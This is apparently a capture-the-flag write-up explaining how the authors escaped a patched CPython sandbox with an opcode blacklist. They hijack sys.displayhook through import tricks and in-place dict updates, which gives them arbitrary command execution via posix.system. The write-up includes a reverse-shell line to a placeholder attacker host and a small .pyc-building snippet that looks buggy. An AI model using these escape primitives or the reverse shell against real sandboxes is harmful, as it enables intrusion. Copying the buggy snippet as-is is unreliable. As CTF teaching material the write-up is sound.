# TI 1337 Plus CE

Writeup written by [Arusekk](https://github.com/Arusekk). Solved by [Arusekk](https://arusekk.github.io/), [haqpl](https://twitter.com/haqpl) and [Disconnect3d](https://twitter.com/disconnect3d_pl).

We included the task files in `./taskfiles/`.

In the task, you have to take control over a patched (sandboxed) CPython.
The patch checks the opcodes against a blacklist, and if any matches,
it goes `exit(1)`.
It also forbids using variables beginning with `_`.

The checks are perfored only if current environment is missing a secret
`COMPILE_SECRET` and the current frame's code object has `co_filename`
set to anything other than a predefined string (`FROZEN_SECRET`).

The blacklist is basically banning everything except for binary expressions
(`BINARY_*` allowed, but `BINARY_SUBSCR` is banned, `INPLACE_*` are allowed,
`LOAD_CONST` allowed),
but it misses several powerful opcodes:
```
IMPORT_NAME
IMPORT_FROM
IMPORT_STAR
```

We can test the code easily:
```py
$ ./python -Si
Python 3.9.1 (tags/v3.9.1-dirty:1e5d33e, Feb  7 2021, 21:41:31) 
[GCC 10.2.0] on linux
>>> import sys
>>> sys
<module 'sys' (built-in)>
>>> sys.__doc__  # exits, LOAD_ATTR banned
```

Great!
What if we could import os.environ to take a look around:
```py
>>> from os import environ
```
It fails, because `Lib/os.py` begins with
```py
LOAD_CONST 'OS routines for NT or Posix depending on '...
STORE_GLOBAL __doc__
```
But we can use `posix` and `sys`!
```py
>>> from posix import environ
>>> environ
environ({'PATH': '/bin:/usr/bin:...', ...})
>>> from sys import *
>>> path
['.', ...]
>>> version_info
sys.version_info(major=3, minor=9, micro=1, releaselevel='final', serial=0)
```
This is the time I made a typo and did:
```py
>>> from ssy import*
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "ErBT0kQUDyGuWIT42Bw", line 1007, in _find_and_load
  File "ErBT0kQUDyGuWIT42Bw", line 984, in _find_and_load_unlocked
ModuleNotFoundError: No module named 'ssy'
```
And this leaked the filename of frozen importlib.
So it may be used to bypass the check, but it is logged to stderr,
so it will need some tweaks.


So the most fascinating are functions and variables from `posix`,
since they are useful gadgets,
and stuff from `sys`, since it is Python's internals.

Okay, so we can explore several paths now:
our scripts are uploaded to fully controlled names
of form `/tmp/ti1337plusce/any_chosen_name/any_other_chosen_name`,
but once we create such a file, we can only append to it.
Our CWD is also set to `/tmp/ti1337plusce/any_chosen_name`.

So we can upload some file with one of extensions: `.py`, `.pyc`, `.cpython-39.so`, `.zip`;
and it will be possible to import it somehow.
`.cpython-39.so` will be opened with `dlopen()` (binary format),
`.pyc` is a cross-platform compiled CPython bytecode (binary format),
`.py` is a normal Python module,
and `.zip` would need appending it to `sys.path` and then we would normally be able to use modules from it.
There is also a restriction that the file contents are encoded back and forth
with UTF-8, so any of the binary formats would need to be valid UTF-8.
We thought that an UTF-8 .so would be too difficult, and it looked unintended.
I even made [a quick tool] for creating ascii ZIPs based on a tool for creating ascii GZIPs
while trying to exploit this, but it turned out that opening ZIPs is written in Python,
so it won't work (see `STORE_GLOBAL __doc__` above). The ZIP was supposed
to contain a single .pyc file, and I wanted to do something like this:
```py
>>> from sys import path
>>> path += ('pwned.pyc.zip',)
>>> import pwned
# pwned does some logic and goes weee here!
```

[a quick tool]: https://github.com/Arusekk/ascii-zip

We can use .pyc with any contents,
because if we set its `co_filename` to the one leaked above,
it will not be checked at all.
We still cannot import pure Python modules, though.

In the meantime, as you probably saw above,
we saw that `INPLACE_ADD` on lists calls to `.extend()`,
and `INPLACE_OR` on sets/dictionaries calls to `.update()`.

So if we knew the compile time secret, we could use
```py
>>> from posix import environ
>>> #environ |= {b'COMPILE_SECRET': b'blahblahblah'}  # BUILD_MAP bannd
>>> #environ |= [(b'COMPILE_SECRET', b'blahblahblah')]  # BUILD_LIST bannd
>>> environ |= ((b'COMPILE_SECRET', b'blahblahblah'),) # LOAD_CONST xD
```
and jail broken!
But the best part was that we can *actually* import special attributes
from modules, like
```py
>>> from sys import __class__ as mod
>>> mod
<class 'module'>
```
(no, frozen importlib had no `__file__`)
So we could use
```py
>>> from sys import __dict__ as sysd
>>> sysd |= (('whatever', 'value'),)
>>> from sys import whatever
>>> whatever
'value'
```
to update sys dict!
Let's take a look at useful sys attributes:
`last_type`, `last_value`, `last_traceback`, `excepthook`, `displayhook`, ...
we decided to override `displayhook`, because it gives a powerful primitive
of calling a function with a single arbitrary argument.
```py
>>> from sys import __dict__ as sysd
>>> from posix import close
>>> #sysd |= (('displayhook', close),)  # BUILD_TUPLE bannd
>>> # but look at this!
>>> from __main__ import __dict__ as myd  # this is our own namespace we have full control of!
>>> displayhook = close
>>> myd
{'displayhook': <built-in function close>, ...}
>>> sysd |= myd
>>> 2


# Hey the prompt disappeared!
```
So we can use `close(2)` and then `dup(1)` in order to redirect stderr to stdout!
We now know the first secret!

```py
>>> from sys import __dict__ as sysd
>>> from __main__ import __dict__ as myd
>>> from posix import close as displayhook
>>> sysd |= myd
>>> 2
from posix import dup as displayhook
sysd |= myd
1
>>> # prompt is back!
>>> import ssy
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "ErBT0kQUDyGuWIT42Bw", line 1007, in _find_and_load
  File "ErBT0kQUDyGuWIT42Bw", line 984, in _find_and_load_unlocked
ModuleNotFoundError: No module named 'ssy'
>>> # now it was logged to stdout, so we have the secret!
```

So I started to build a .pyc which would have `co_filename` set to that value
(the first version is really easy, code below, not much intimacy about .pyc files):
```py
import marshal
from importlib._bootstrap_external import MAGIC_NUMBER

with open('payload.py') as fp:
    t = fp.read()
code = compile(t, 'ErBT0kQUDyGuWIT42Bw', 'exec')
with open('payload.pyc') as fp2:
    fp2.write(MAGIC_NUMBER)
    fp2.truncate(16)
    fp2.seek(16)  # there are some timestamps and meta, but they are irrelevant to us
    marshal.dump(code, fp)
```
But that .pyc is not a valid UTF-8 if it uses any opcode >= 128, e.g. `CALL_FUNCTION*`,
which are essential.
So now I started to build a .zip with a .pyc inside, and realized that this is worthless,
and tried building a valid UTF-8 .pyc, because it was quite very possible.
And [I did it], but another team member realized that we have a perfect gadget already:
`posix.system()`!.

[I did it]: https://github.com/Arusekk/utfpyc

Let's trace the thought process again:
```py
>>> import sys
>>> from posix import system
>>> sys.displayhook = system             # no: STORE_ATTR bannd
>>> from sys import __dict__ as sysd     # let's get around
>>> sysd['displayhook'] = system         # no: STORE_SUBSCR bannd
>>> sysd.update({'displayhook': system}) # no: LOAD_ATTR and CALL_FUNCTION bannd
>>> sysd |= {'displayhook': system}      # yup if we have such a dict somewhere
>>> from __main__ import __dict__ as myd # but hey, we have access to a dict of our own namespace!
>>> displayhook = system                 # same as myd['displayhook'] = system
>>> sysd |= myd                          # yup if we have such a dict somewhere
>>>
>>> 'bash -c "bash -i >& /dev/tcp/evil.com.example/4444" 0>&1'  # do nasty stuff now
```

So the final solution is:
```py
>>> from sys import __dict__ as sysd
>>> from __main__ import __dict__ as myd
>>> from posix import system as displayhook
>>> sysd |= myd
>>> 'cat /flag*.txt'
dice{a_ja1lbr0k3n_calcul4t0r?!}
```
With no usage of filesystem at all!
